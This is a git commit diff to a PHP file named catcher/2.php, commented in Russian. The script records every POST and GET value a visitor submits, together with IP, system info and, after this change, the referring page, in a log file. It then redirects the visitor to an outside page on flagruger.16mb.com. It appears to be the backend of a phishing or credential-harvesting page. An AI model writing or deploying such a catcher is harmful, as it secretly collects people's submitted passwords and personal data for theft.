275a087442754ae9462aef207f953e45b8d7fb81
zakapau <zakapau@gmail.com>
2015-12-06 00:45:15 +0300

    Update 2.php

--- catcher/2.php
+++ catcher/2.php
@@ -7,8 +7,11 @@ if(is_file($file)){ //Проверяем наличие файла и возмо
 $fo=fopen($file,"a+"); //Открываем файл на запись в конец 
 $res2 = print_r($_POST, true); //методом POST все берем
 $res3 = print_r($_GET, true); //методом GET все берем
-$res="\n$data  |  $ip  |  $sysinfo | \nPOST: $res2 \nGET: $res3";
+$res4 = $_SERVER['HTTP_REFERER']; //откуда пришел пользователь
+$res="\n$data  |  $ip  |  $sysinfo |  $res4 |\nPOST: $res2 \nGET: $res3";
 $fw=fwrite($fo,$res); //Записываем в файл 
 fclose($fo); //Закрываем файл 
-} 
+}
+header("Location: http://flagruger.16mb.com/call.html"); //редирект
+die();
 ?>
